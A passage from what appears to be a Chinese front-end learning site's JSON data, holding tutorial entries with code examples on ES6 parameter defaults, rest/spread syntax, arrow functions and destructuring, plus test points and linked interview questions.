如果调用函数时缺少提供实参，那么形参默认值为 undefined。\n\n有时候我们想要设置特定的默认值，在 ES6 之前还不支持显式地设置默认值的时候，只能采用变通的方式：\n\n代码语言：javascript\n\n复制\n\n```\nfunction sayHi(name) {\n    name = name || 'everyone';\n\tconsole.log( 'Hello ' + name + '!');\n}\nsayHi(); // 输出 'Hello everyone!' \n```\n\n通过检查参数值的方式判断有没有赋值，上面的做法虽然简便，但缺点在于如果传入的实参对应布尔值为 false ，实参就不起作用了。需要更精确的话可以用 if 语句或者三元表达式，判断参数是否等于 undefined，如果是则说明这个参数缺失 ：\n\n代码语言：javascript\n\n复制\n\n```\n// if 语句判断\nfunction sayHi(name) {\n\tif (name === undefined) {\n\t\tname = 'everyone';\n\t}\n\tconsole.log( 'Hello ' + name + '!');\n\n}\n// 三元表达式判断\nfunction sayHi(name) {\n\tname =  (name !== undefined) ? name : 'everyone';\n\t\n\n    console.log( 'Hello ' + name + '!');\n\n}\n```\n\nES6 就方便了许多，因为它支持了显式的设置默认值的方式，就像这样：\n\n代码语言：javascript\n\n复制\n\n```\nfunction sayHi(name = 'everyone') { // 定义函数时，直接给形参赋值\n\tconsole.log( 'Hello ' + name + '!');\n}\n\nsayHi(); // 输出 'Hello everyone!' \nsayHi('Tony'); // 输出 'Hello Tony!' \nsayHi(undefined); // 输出 'Hello everyone!'\n```\n\n这些结果表明了，它也是通过参数是否等于 undefined 来判定参数是否缺失的。\n\n默认值不但可以是一个值，它还可以是任意合法的表达式，甚至是函数调用：\n\n代码语言：javascript\n\n复制\n\n```\nfunction sayHi(name = 'every'+'one') {\n\tconsole.log( 'Hello ' + name + '!');\n}\n\nsayHi(); // 输出 'Hello everyone!' \n//--------------------------------------\nfunction foo() {\n    console.log('调用foo');\n    return 'Tony';\n}\n\nfunction sayHi(name = foo()) {\n\tconsole.log( 'Hello ' + name + '!');\n}\n\t\t  \nsayHi(); // 输出 '调用foo'\n         // 输出 'Hello Tony!' \n\nsayHi(undefined); // 输出 '调用foo'\n                  // 输出 'Hello Tony!' \n\nsayHi('John'); // 输出 'Hello John!'\n```\n\n可以看到，函数参数的默认值只有在函数调用时，参数的值缺失或者是 undefined 才会求值，不会在函数定义时求值。\n\n参数默认值的位置 通常我们给参数设置默认值，是为了调用函数时可以适当省略参数的传入，这里要注意的是，有多个参数时，设置了默认值的参数如果不是放在尾部，实际上它是无法省略的。\n\n代码语言：javascript\n\n复制\n\n```\nfunction fn(x = 1, y) {\n\tconsole.log([x, y]);\n}\n\nfn(); // 输出 [1, undefined]\nfn(2); // 输出 [2, undefined]\nfn(, 2); // 报错，语法错误（这里不支持像数组那样的空槽）\nfn(undefined, 2); // 输出 [1, 2] （那还不如传个 1 方便呢!）\n```\n\n上面例子中，给形参 x 设置的默认值就显得没有任何意义了。因此，设置默认值的参数放在尾部是最好的做法：\n\n代码语言：javascript\n\n复制\n\n```\nfunction fn(x, y = 2) {\n\tconsole.log([x, y]);\n}\n\nfn(); // 输出 [undefined, 2]\nfn(1); // 输出 [1, 2]\nfn(1, 1) // 输出 [1, 1]\n```\n\n参数的省略问题 在多个参数设置了默认值的情况下，那么问题又来了，你并不能省略比较靠前的参数，而只给最后的一个参数传入实参。\n\n代码语言：javascript\n\n复制\n\n```\nfunction fn(x, y = 2, z = 3) {\n\tconsole.log([x, y, z]);\n}\n\nfn(1, , 10) // 报错\n```\n\n前面我们知道，可以通过传入对象的这种方式去避免参数顺序的限制。那参数默认值如何实现呢？用 || 、 if 语句或者三元表达式去判断也是解决办法，但这样就显得有些落后了。接下来要讨论的是另外两种 ES6 中的全新方式。\n\n参数默认值和 Object.assign() 结合使用\n\n代码语言：javascript\n\n复制\n\n```\nfunction fn(obj = {}) {\n    let defaultObj = {\n        x: undefined,\n        y: 2,\n        z: 3\n    }\n    \n\n    let result = Object.assign(defaultObj, obj);\n    \n    console.log([result.x, result.y, result.z]);\n\n}\n\nfn(); // 输出 [undefined, 2, 3]\nfn({ x: 1, z: 10 }); // 输出 [1, 2, 10]\n```\n\n上面的例子中，在函数中定义了一个对象 defaultObj ，变通地利用其中的属性作为参数的默认值，然后利用 Object.assagin() 把传入的对象和默认对象进行合并，defaultObj 中的属性会被 obj 的相同属性覆盖，obj 中如果有其他属性会分配给 defaultObj 。这里用一个变量接收返回的合并对象。\n\n同时形参 obj 也设置了默认值为一个空对象，防止函数调用时不传任何参数，因为这会导致 Object.assign() 接收的第二个参数是 undefined ，从而产生报错。\n\n参数默认值和解构赋值结合使用 函数调用时，实参和形参的匹配实际上是一个隐式的赋值过程，所以，参数传递也可以进行解构赋值：\n\n代码语言：javascript\n\n复制\n\n```\nfunction fn({ x, y = 2, z = 3 }) {\n    console.log([x, y, z]);\n}\n\nfn({}); // 输出 [undefined, 2, 3]\nfn({ x: 1, z: 10 }); // 输出 [1, 2, 10]\n```\n\n在这个例子中，使用的只是对象的解构赋值默认值，还没有使用函数参数的默认值。如果函数调用时不传任何参数，也会产生报错，因为这导致了参数初始化时解构赋值失败，相当于执行了 {x, y = 2, z = 3} = undefined 这样的代码。\n\n同样的，你可以利用参数默认值的语法，给 {x, y = 2, z = 3} 设置一个默认的解构对象，使得不传参函数也能够顺利执行：\n\n代码语言：javascript\n\n复制\n\n```\nfunction fn({ x, y = 2, z = 3 } = {}) {\n    console.log([x, y, z]);\n}\n\nfn(); // 输出 [undefined, 2, 3]\n```\n\n这里出现了双重的默认值，可能有些绕，那么用一段伪代码来解释以上的参数初始化过程就是：\n\n代码语言：javascript\n\n复制\n\n```\nif( 实参 === {...} ) { // 当 fn({...});     \n    { x, y = 2, z = 3 } = {...};\n                        \n} else if ( 实参 === undefined ){ // 当 fn();\n    { x, y = 2, z = 3 } = {};\n}\n```\n\n双重默认值有一点细节需要特别注意，就是解构赋值默认值和函数参数默认值的差别，看下面例子：\n\n代码语言：javascript\n\n复制\n\n```\nfunction fn ({ x = 1 } = {}, { y } = { y: 2 }){\n    console.log(x, y);\n}\n\nfn(); // 输出 1 2\nfn({ x: 10 }, { y: 20 }); // 输出 10 20\nfn({},{}); // 1 undefined\n```\n\n这个函数中，有两组参数采用了解构赋值的方式，看似 x 和 y 都设置了默认值，虽然是不同的两种形式，但显然不是任何情况下结果都相同的。当传入的参数是{}时，y 并没有获取到默认值 2 ，为什么会这样呢？结合前面的伪代码例子来看：\n\n代码语言：javascript\n\n复制\n\n```\nfn({ x: 10 }, { y: 20 }); // 初始化时: { x = 1 } = { x: 10 }, { y } = { y: 20 }\n\nfn({},{}); // 初始化时: { x = 1 } = {}, { y } = {}\n```\n\n当传入的参数是{}时，函数参数没有缺失也不是 undefined ，所以函数参数默认值是不起作用的。同时 {} 里面也没有 x 和 y 的对应值，x 得到的 1 是解构赋值默认值，而 y 由于没有设置解构赋值默认值，所以它默认是 undefined。\n\n参数默认值的作用域与暂时性死区 还有一个小细节，一旦有参数设置了默认值，那么它们会形成自己的作用域（包裹在(…)中），因此不能引用函数体中的变量：\n\n代码语言：javascript\n\n复制\n\n```\nfunction foo(a = b) {\n    let b = 1;\n}\n\nfoo(); // 报错，b 未定义\n```\n\n但这个作用域只是临时的，参数初始化完毕后，这个作用域就不存在了。\n\n它也符合普通作用域的规则：\n\n代码语言：javascript\n\n复制\n\n```\nlet b = 2;\n\nfunction foo(a = b) {\n    let b = 1;\n    return a;\n}\n\nfoo(); // 2\n```\n\n上面例子中，存在一个全局变量 b，那么形参 a 会获取到全局变量 b 的值。\n\n当然，如果形参作用域中存在一个形参 b 的话，它优先获取到的是当前作用域的：\n\n代码语言：javascript\n\n复制\n\n```\nlet b = 2;\n\nfunction foo(b = 3 ,a = b) {\n    return a;\n}\n\nfoo(); // 3\n```\n\n给多个参数设置默认值，它们会按顺序初始化的，遵循“暂时性死区”的规则，即前面的参数不能引用后面的参数：\n\n代码语言：javascript\n\n复制\n\n```\nfunction foo(a = b, b = 2) {\n    return a + b;\n}\n\nfoo(); // 报错，b 在初始化之前不能访问\n```\n\n五、参数的收集与展开 剩余参数 ES6 提供了**剩余参数（rest）**的语法（…变量名），它可以收集函数多余的实参（即没有对应形参的实参），这样就不再需要使用 arguments 对象来获取了。形参使用了 … 操作符会变成一个数组，多余的实参都会被放进这个数组中。\n\n剩余参数基本用法：\n\n代码语言：javascript\n\n复制\n\n```\nfunction sum(a, ...values) {\n\n    for (let val of values) {\n        a += val;\n    }\n    \n    return a;\n\n}\n\nsum(0, 1, 2, 3); // 6\n```\n\n上面例子中，在参数初始化时，首先根据参数位置进行匹配，把 0 赋值给 a ，然后剩余的参数 1、2、3 都会被放进数组 values 中。\n\n下面是分别用 arguments 对象和剩余参数来获取参数的对比例子：\n\n代码语言：javascript\n\n复制\n\n```\n// arguments 的写法\nfunction sortNumbers() {\n\treturn Array.prototype.slice.call(arguments).sort();\n}\n\n// 剩余参数的写法\nconst sortNumbers = (...numbers) => {\n    return numbers.sort();\n}\n可以看出剩余参数的写法更加简洁。尽管 arguments 是一个类数组，也是可迭代对象，但它终究不是数组。它不支持数组方法，当我们使用 arguments 时，如果想要调用数组方法，就必须使用Array.prototype.slice.call先将其转为数组。\n```\n\n而剩余参数它不同于 arguments 对象，它是真正的 Array 实例，能够很方便地使用数组方法。并且箭头函数也支持剩余参数。\n\n另外，使用剩余参数不会影响 arguments 对象的功能，它仍然能够反映调用函数时传入的参数。\n\n剩余参数的位置 剩余参数必须是最后一个形参，否则会报错。\n\n代码语言：javascript\n\n复制\n\n```\n// 报错\nfunction fn1(a, ...rest, b) {\n\tconsole.log([a, b, rest]);\n} \n\n// 正确写法\nfunction fn2(a, b, ...rest) {\n    console.log([a, b, rest]);\n}\n\nfn2(1, 2, 3, 4) // 输出 [1, 2, [3, 4]]\n```\n\n展开语法 前面我们知道了如何把多余的参数收集为一个数组，但有时候我们需要做一些相反的事，例如要把一个数组中的元素分别传入给某个函数，而不是传入一个数组，像这样：\n\n代码语言：javascript\n\n复制\n\n```\nfunction sum(...values) {\n    let sum = 0;\n    \n\n    for (let val of values) {\n        sum += val;\n    }\n    \n    return sum;\n\n}\n\nlet arr = [1, 2, 3, 4];\n\nsum(arr); // \"01,2,3,4\"\n```\n\n上面例子的函数会把所有传进来的数值累加，如果直接传入一个数组，就得不到我们想要的结果。\n\n例子中传入一个数组， values 的值会变成 \\[\\[1, 2, 3, 4\\]\\]，导致数组 values 中只有一个元素，而这个元素的类型是数组。那么函数返回值就是数值 0 和数组 \\[1, 2, 3, 4\\]相加的结果了，两者各自进行了类型的隐式转换变成字符串，然后再相加，是一个字符串拼接的效果。\n\n要实现把数组拆解传入给函数，首先不可能一个个传入参数——sum(arr\\[0\\], arr\\[1\\], arr\\[2\\], arr\\[3\\]);，因为不是任何时候都知道数组中有多少个元素的，而且数组中可能会非常多的元素，手动传是不明智的。\n\n比较可行的是借助 apply() 方法：\n\n代码语言：javascript\n\n复制\n\n```\nsum.apply(null, arr); // 10\n```\n\n但这还不是最优解，那么重点来了！\n\nES6 新增的**展开语法（spread）**可以帮助我们面对这种情况。它也是使用 …变量名 的语法，虽然跟剩余参数语法一样，但是用途完全相反，它能够把一个可迭代对象拆分成逗号分隔的参数序列。\n\n在函数调用时，它的应用是这样子的：\n\n代码语言：javascript\n\n复制\n\n```\nsum(...arr); // 10\n\n// 相当于 sum(1,2,3,4);\n```\n\n它甚至可以随意搭配常规值使用，没有前后位置限制，还可以同时传入多个可迭代对象：\n\n代码语言：javascript\n\n复制\n\n```\nsum(-1, ...arr); // 9\nsum(...arr, 5); // 15\nsum(-1, ...arr, 5); // 14\nsum(-1, ...arr, ...[5, 6, 7]); // 27\n```\n\n",
    "testPoint": "\n1. **定义与用法**：\n   - ES6中，函数参数可以使用`=`操作符设置默认值。\n   - 当调用函数时未传递该参数或传递`undefined`，将使用默认值。\n\n2. **TypeScript中的默认参数**：\n   - TypeScript支持为函数参数添加类型注解，并同时设置默认值。\n   - 有助于在编译阶段捕获错误。\n\n3. **应用**：\n   - 提高函数灵活性，减少代码冗余。\n   - 处理可选参数，简化函数调用。\n\n4. **注意事项**：\n   - 默认值仅在参数未传递或传递`undefined`时生效。\n   - 参数顺序：具有默认值的参数应位于没有默认值的参数之后（虽然这不是硬性规定，但通常建议这样做以提高代码可读性）。\n\n",
    "exerciseKeyList": "[\"9c288de3-0f6e-4a95-a243-d9d01e443b79\",\"b3c9e524-a1b4-4348-9ce5-f2beb80caf32\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T04:51:39.000Z",
    "updateAt": "2024-12-17T02:19:30.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "9c288de3-0f6e-4a95-a243-d9d01e443b79",
        "title": "js 函数参数有默认值时，如果传递的参数是 undefined 那么会被默认值赋值吗？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-22T10:50:36.000Z"
      },
      {
        "exerciseKey": "b3c9e524-a1b4-4348-9ce5-f2beb80caf32",
        "title": "普通函数动态参数 和 箭头函数的动态参数有什么区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-22T11:09:10.000Z"
      }
    ]
  },
  "50": {
    "id": 50,
    "tagId": 24,
    "title": "箭头函数",
    "explanation": "\n\n一、箭头函数的特点\n---------\n\n### 1\\. 相比普通函数，箭头函数有更加简洁的语法。\n\n> 普通函数\n\n```\nfunction add(num) {\n  return num + 10\n}\n\n```\n\n> 箭头函数\n\n```\nconst add = num => num + 10;\n\n```\n\n### 2\\. 箭头函数不绑定this，会捕获其所在上下文的this，作为自己的this。\n\n> 这句话需要注意的是，箭头函数的外层如果有普通函数，那么箭头函数的this就是这个外层的普通函数的this，箭头函数的外层如果没有普通函数，那么箭头函数的this就是全局变量。\n\n> 下面这个例子是箭头函数的外层有普通函数。\n\n```\nlet obj = {\n  fn:function(){\n      console.log('我是普通函数',this === obj)   // true\n      return ()=>{\n          console.log('我是箭头函数',this === obj) // true\n      }\n  }\n}\nconsole.log(obj.fn()())\n\n```\n\n> 下面这个例子是箭头函数的外层没有普通函数。\n\n```\nlet obj = {\n    fn:()=>{\n        console.log(this === window);\n    }\n}\nconsole.log(obj.fn())\n// true\n\n```\n\n### 3\\. 箭头函数是匿名函数，不能作为构造函数，不可以使用new命令，否则后抛出错误。\n\n![image.png](https://static.ecool.fun//article/64f87229-4153-4e4e-b032-81baf9d1eaa2.awebp)\n\n### 4\\. 箭头函数不绑定arguments，取而代之用rest参数解决，同时没有super和new.target。\n\n> 箭头函数没有arguments、super、new.target的绑定，这些值由外围最近一层非箭头函数决定。\n\n> 下面的这个函数会报错，在浏览器环境下。\n\n```\nlet f = ()=>console.log(arguments);\n\n//报错\nf(); // arguments is not defined\n\n```\n\n> 下面的箭头函数不会报错，因为arguments是外围函数的。\n\n```\nfunction fn(){\n  let f = ()=> {\n    console.log(arguments)\n  }\n  f();\n}\nfn(1,2,3) // [1,2,3]\n\n```\n\n> 箭头函数可以通过拓展运算符获取传入的参数。\n\n![image.png](https://static.ecool.fun//article/0539c825-6d13-459b-84b4-5b41cfc50104.awebp)\n\n### 5\\. 使用call,apply,bind并不会改变箭头函数中的this指向。\n\n*   当对箭头函数使用call或apply方法时，只会传入参数并调用函数，并不会改变箭头函数中this的指向。\n*   当对箭头函数使用bind方法时，只会返回一个预设参数的新函数，并不会改变这个新函数的this指向。\n\n> 请看下面的代码\n\n```\nwindow.name = \"window_name\";\n\nlet f1 = function () {\nreturn this.name;\n};\nlet f2 = () => this.name;\n\nlet obj = { name: \"obj_name\" };\n\nconsole.log(f1.call(obj));  //obj_name\nconsole.log(f2.call(obj));  // window_name\nconsole.log(f1.apply(obj)); // obj_name\nconsole.log(f2.apply(obj)); // window_name\nconsole.log(f1.bind(obj)());  // obj_name\nconsole.log(f2.bind(obj)());  // window_name\n\n```\n\n### 6\\. 箭头函数没有原型对象prototype这个属性\n\n> 由于不可以通过new关键字调用，所以没有构建原型的需求，所以箭头函数没有prototype这个属性。\n\n```\nlet F = ()=>{};\nconsole.log(F.prototype) // undefined\n\n```\n\n### 7\\. 不能使用yield关键字，不能用作Generator函数\n\n二、arguments辨析\n-------------\n\n> 既然上文我们提到了arguments，那么下面我们就仔细讲讲这个arguments。\n\n### arguments有什么用？\n\n> arguments对象是所有非箭头函数中都可用的局部变量，可以使用arguments对象在函数中引用函数的参数，此对象包含传递给函数的每一个参数，第一个参数在索引0的位置。\n\n### 如何将arguments对象转换为数组\n\n1.  通过slice\n2.  通过拓展运算符\n3.  通过Array.from\n\n```\nvar args = Array.prototype.slice.call(arguments);\nvar args = [].slice.call(arguments);\n\nconst args = Array.from(arguments);\nconst args = [...arguments];\n\n```\n\n### arguments函数如何调用自身函数？\n\n> 我们先看看下面这个函数，这个是可以正常运行的。\n\n```\nfunction factorial (n) {\n    return !(n > 1) ? 1 : factorial(n - 1) * n;\n}\n\n[1,2,3,4,5].map(factorial);\n\n```\n\n> 但是作为匿名函数则不行。\n\n```\n[1,2,3,4,5].map(function (n) {\n    return !(n > 1) ? 1 : /* what goes here? */ (n - 1) * n;\n});\n\n```\n\n> 因此arguments.callee诞生了。\n\n```\n[1,2,3,4,5].map(function (n) {\n    return !(n > 1) ? 1 : arguments.callee(n - 1) * n;\n});\n\n```\n\n> 所以arguments要想调用自身的匿名函数，可以通过arguments.callee来调用。\n\n  \n",
    "testPoint": "\n\n1. **定义与语法**：\n   - 了解箭头函数的基本定义和语法结构。\n   - 掌握参数列表、箭头符号和函数体的省略规则。\n\n2. **特性**：\n   - 箭头函数没有自己的`this`，继承外层作用域的`this`。\n   - 不能作为构造函数使用（`new`关键字无效）。\n   - 没有`arguments`对象，但可以使用`rest`参数。\n   - `this`指向固定，不能通过`call`、`apply`或`bind`改变。\n   - 不支持`new.target`和`super`。\n\n3. **应用场景**：\n   - 回调函数：简化代码结构。\n   - 数组方法：如`map`、`filter`、`reduce`等。\n   - 事件监听：避免`this`指向问题。\n   - 函数式编程：高阶函数、闭包等。\n\n4. **注意事项**：\n   - 避免滥用，特别是在需要明确`this`指向或`arguments`对象时。\n   - 嵌套箭头函数可能导致`this`指向混乱。\n   - 与异步操作结合时，注意执行顺序和结果处理。\n\n",
    "exerciseKeyList": "[\"82939890-c1de-45f8-b27d-b2675d58763e\",\"b3c9e524-a1b4-4348-9ce5-f2beb80caf32\",\"bc85fae4-ca41-474a-be03-d670813510a3\",\"33363940-179b-4ae3-9cd3-7bf0a5619df9\",\"31134096-417d-48df-8030-68dd004c40d1\",\"71f7613a-3703-4c0c-85c3-d8ad31fac232\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T14:16:36.000Z",
    "updateAt": "2024-12-17T02:19:35.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "31134096-417d-48df-8030-68dd004c40d1",
        "title": "如果new一个箭头函数会怎么样？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-22T10:22:40.000Z",
        "updateAt": "2024-07-20T11:56:21.000Z"
      },
      {
        "exerciseKey": "33363940-179b-4ae3-9cd3-7bf0a5619df9",
        "title": "箭头函数的 this 指向哪⾥？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-22T10:24:18.000Z",
        "updateAt": "2024-07-20T11:56:06.000Z"
      },
      {
        "exerciseKey": "71f7613a-3703-4c0c-85c3-d8ad31fac232",
        "title": "箭头函数和普通函数有啥区别？箭头函数能当构造函数吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T08:01:14.000Z",
        "updateAt": "2024-07-22T10:52:32.000Z"
      },
      {
        "exerciseKey": "82939890-c1de-45f8-b27d-b2675d58763e",
        "title": "箭头函数为何不能作为构造函数使用？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:58:02.000Z"
      },
      {
        "exerciseKey": "b3c9e524-a1b4-4348-9ce5-f2beb80caf32",
        "title": "普通函数动态参数 和 箭头函数的动态参数有什么区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-22T11:09:10.000Z"
      },
      {
        "exerciseKey": "bc85fae4-ca41-474a-be03-d670813510a3",
        "title": "箭头函数解决了什么问题",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-09T13:56:58.000Z"
      }
    ]
  },
  "51": {
    "id": 51,
    "tagId": 24,
    "title": "解构赋值",
    "explanation": "\n\n解构赋值概念\n------\n\n**解构赋值**语法是一种 Javascript 表达式。\n\n*   通过解构赋值，可以将属性/值从对象/数组中取出,赋值给其他变量。\n*   解构赋值是通过将结构中的各元素复制到变量中来达到“解构”的目的。但对象/数组本身不会被修改。\n\n数组解构\n----\n\n### 基本使用\n\n📖 可以在定义变量的同时，使用解构进行赋值\n\n```\nlet [one, two, three] = foo;\n\n//等同于\n\nlet one = foo[0];\nlet two = foo[1];\nlet three = foo[2];\n\n```\n\n![image-20211102234140924](https://static.ecool.fun//article/531e06cf-4e94-4ebc-ab55-fe26c3198b10.awebp)\n\n📖 也可以先声明变量，在进行解构赋值\n\n![image-20211102234345905](https://static.ecool.fun//article/a2ade189-7b28-4038-99f9-c554d1e7bcd8.awebp)\n\n### 设置默认值\n\n当【左边≠右边】时，可以先设置一个默认值，否则取不到值的变量会变成undefined\n\n![image-20211102234546880](https://static.ecool.fun//article/19d1eb3d-7f52-4e98-880d-e96104a3d0bb.awebp)\n\n### 剩余值处理\n\n可以使用三个点 `\"...\"`\\+ 参数来接收剩余的所有元素，变量名称随意，必须在最后一个参数的位置上\n\n![image-20211103001943820](https://static.ecool.fun//article/141de2db-53e7-4570-954c-33dc9f04c253.awebp)\n\n### 进阶用法\n\n🎨 可以和`split` 函数结合使用，比如\n\n```\nlet [Mother,Father] = \"judy,pete\".split(',');\n\nconsole.log(Mother)   //judy\nconsole.log(Father)   //pete\n\n```\n\n🎨 可以使用逗号忽略元素，比如\n\n```\nlet [name1,,name3] = [\"Julius01\", \"Caesar02\", \"Consul03\"]\n\n```\n\n![image-20211103000344494](https://static.ecool.fun//article/39fb32b6-9925-4d59-8633-d8d2e8bf8232.awebp)\n\n🎨 可以直接赋值给对象的属性，比如\n\n```\nlet user = {};\n[user.name, user.surname] = [\"Ilya\",\"Kantor\"]\n\n```\n\n![image-20211103000639064](https://static.ecool.fun//article/c748c9aa-dab7-46c2-a7ab-1fba6656173c.awebp)\n\n🎨 可以结合.entries() 方法来遍历对象的“键—值”对，比如\n\n```\nfor (let [key, value] of Object.entries(fruit)) {...}\n\n```\n\n![image-20211103001335613](https://static.ecool.fun//article/b132c845-e086-40a2-be73-31bd37be8d04.awebp)\n\n🎨 可以利用解构来进行变量交换，比如\n\n![image-20211103001707703](https://static.ecool.fun//article/c042598b-1593-42ea-a464-5bb388762837.awebp)\n\n对象解构\n----\n\n### 基本使用\n\n注意变量名称保持一致\n\n```\nlet {a, b} = {a:\"Julius01\", b:\"Caesar02\"}\n\n```\n\n![image-20211103002729745](https://static.ecool.fun//article/09ae5205-3e20-416d-8a02-6cc0acac370b.awebp)\n\n📖 **新的变量名称**\n\n如果想要从一个对象中提取变量并赋值给和对象属性名不同的新的变量名。应该这样写：\n\n```\nlet {name1: a,name2: b} = {name1:\"Julius01\", name2:\"Caesar02\"}\n\n```\n\n![image-20211103003018613](https://static.ecool.fun//article/5b75e700-4c17-40ae-bb62-a98ff1b8f2d2.awebp)\n\n> 冒号表示“什么值：赋值给谁”，如以上示例表示，把name1赋值给变量a，把name2赋值给变量b\n\n### 设置默认值\n\n对象的解构同样可以设置默认值\n\n```\nlet { a, b = 2} = {a:\"Julius01\"}\n\n```\n\n![image-20211103003148662](https://static.ecool.fun//article/73c606b1-baf8-4f45-9ccb-e15a9d3e5e1b.awebp)\n\n📖 **命名并且设置默认值**\n\n一个属性可以同时\n\n*   1）从一个对象解构，并分配给一个不同名称的变量\n*   2）分配一个默认值，以防未解构的值是 `undefined`。\n\n![image-20211103010730134](https://static.ecool.fun//article/f95583bd-2297-4bfd-8e66-f82b30bed2ea.awebp)\n\n### 剩余值的处理\n\n当对象拥有的属性数量比我们提供的变量数量还多时，可以只取其中部分属性，然后用1个变量来存剩余的值，比如\n\n```\nlet  fruit = {\n   apple:'苹果',\n   banana:'香蕉',\n   grape:'葡萄'\n}\n\nlet {grape, ...restFruit} = fruit;\n\n```\n\n![image-20211103004812781](https://static.ecool.fun//article/44b7d99a-70fb-4ce3-bf9e-7f6352839c71.awebp)\n\n### 注意！！！\n\n🎨 对象解构赋值，变量的顺序不重要，比如：\n\n![image-20211103004156384](https://static.ecool.fun//article/c5dcf781-7a76-4c98-a125-0dcc2d859502.awebp)\n\n🎨 不支持直接先声明变量，后解构赋值\n\n可以看到，数组的解构先声明后赋值是正确的，但是对象的会报错。\n\n![image-20211103005510359](https://static.ecool.fun//article/cf339221-45d0-4b52-a6f3-84d983c7a2c1.awebp)\n\n这是因为在 JavaScript 中会把{...}当做一个代码块。所以这样的代码`{a, b, c} = {a: \"hi\", b: 'axjy', c: 99};`是无效的。如果想要使它有效，则需要把整个赋值表达式用括号 `(...)` 包起来，以此来告诉JavaScript 这不是一个代码块。\n\n![image-20211103010239038](https://static.ecool.fun//article/579a22ef-c340-4277-ac6f-cf7e6bf452c1.awebp)\n\n> `( ... )` 表达式之前一定要有一个分号，否则它可能会被当成上一行中的函数执行。\n\n总结\n--\n\n*   解构数组的完整语法`let [item1 = default, item2, ...rest] = array`\n*   解构对象的完整语法`let {prop : varName = default, ...rest} = object`\n",
    "testPoint": "\n### 一、基础概念\n\n* **定义**：解构赋值是一种JavaScript表达式，允许从数组或对象中提取数据，然后将其赋值给变量。\n* **用途**：简化代码，提高可读性，方便从复杂数据结构中提取所需信息。\n\n### 二、数组解构赋值\n\n* **基本用法**：如何从数组中提取元素并赋值给变量。\n* **不完全解构**：当数组元素数量少于变量数量时，未赋值的变量将默认为`undefined`。\n* **剩余参数**：使用剩余参数（`...`）收集数组中的剩余元素。\n* **默认值**：为变量提供默认值，以防数组元素为`undefined`。\n* **跳过元素**：在解构过程中跳过不需要的元素。\n\n### 三、对象解构赋值\n\n* **基本用法**：如何从对象中提取属性并赋值给变量。\n* **重命名**：在解构过程中为变量提供新的名称。\n* **嵌套解构**：处理嵌套对象结构，连续进行解构赋值。\n* **默认值**：为对象属性提供默认值。\n\n### 四、高级技巧\n\n* **函数参数解构**：在函数定义时使用解构赋值来简化参数提取。\n* **结合剩余参数和默认值**：在处理不完全的数据结构时，同时使用剩余参数和默认值。\n\n### 五、实际应用场景\n\n* **API响应数据处理**：从API返回的响应数据中提取所需信息。\n* **UI组件渲染**：从组件的props中提取数据并赋值给组件的状态或属性。\n* **应用状态管理**：在Redux、Vuex等状态管理库中，使用解构赋值来简化状态提取和更新。\n\n### 六、注意事项\n\n* **解构赋值的目标**：必须是可遍历对象，如数组、字符串、实现Iterator接口的数据结构等。\n* **变量声明**：在使用解构赋值时，通常需要提前声明变量（除非在函数参数中直接使用）。\n* **默认值触发条件**：当解构模式有匹配结果，且匹配结果是`undefined`时，会触发默认值作为返回结果。\n\n",
    "exerciseKeyList": "[\"97fda656-bfa1-4aa9-b1a5-1d0247178cfc\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T14:20:40.000Z",
    "updateAt": "2024-12-17T02:19:37.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "97fda656-bfa1-4aa9-b1a5-1d0247178cfc",
        "title": "如何让 var [a, b] = {a: 1, b: 2} 解构赋值成功？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-03-18T11:22:53.000Z",
        "updateAt": "2024-08-10T17:07:40.000Z"
      }
    ]
  },
  "52": {
    "id": 52,
    "tagId": 24,
    "title": "展开运算符",
    "explanation": "ES6 新增了很多特性，扩展运算符就是其中一个。简单的三个点号，让原本繁琐的代码瞬间变得简洁、优雅。就让我们看看它有哪些常见用法吧。\n\n## 让函数的 Apply 调用方式成为过去\n\n有时候我们需要通过 `Function.prototype.apply` 来调用函数，参数就放在一个数组里。\n\n```auto\nfunction doStuff (x, y, z) { }\nvar args = [0, 1, 2];\n\n// 调用函数并传参\ndoStuff.apply(null, args);\n```\n\n现在有了展开运算符，我们可以完全避免使用 `apply`，只需在调用函数时在数组前加上展开运算符：\n\n```gams\ndoStuff(...args);\n```\n\n代码变得更短、更简洁，也不需要一个毫无用处的 `null`！\n\n## 合并数组\n\n合并数组有各种方式，但是展开运算符为我们提供了一种新思路：\n\n```auto\narr1.push(...arr2) // 在数组后面添加 arr2 里的元素\narr1.unshift(...arr2) //在数组前面添加 arr2 里的元素\n```\n\n如果你想合并两个数组，并且想把元素放到数组中的任何位置，你可以这么做：\n\n```auto\nvar arr1 = ['two', 'three'];\nvar arr2 = ['one', ...arr1, 'four', 'five'];\n\n// [\"one\", \"two\", \"three\", \"four\", \"five\"]\n```\n\n代码少了很多，还可以随意控制位置！\n\n## 拷贝数组\n\n拷贝数组是个常见的任务，过去我们使用 `Array.prototype.slice`  \n来完成，但现在我们可以通过展开运算符得到数组的副本：\n\n```auto\nvar arr = [1,2,3];\nvar arr2 = [...arr]; // 等同于 arr.slice()\narr2.push(4)\n```\n\n这里要注意，数组里的对象仍然是引用类型的，因此实际上并不是所有内容都被“拷贝”了。\n\n## 将参数或 NodeList 转成数组\n\n跟拷贝数组类似，我们用 `Array.Prototype.slice` 将 `NodeList`和 `arguments` 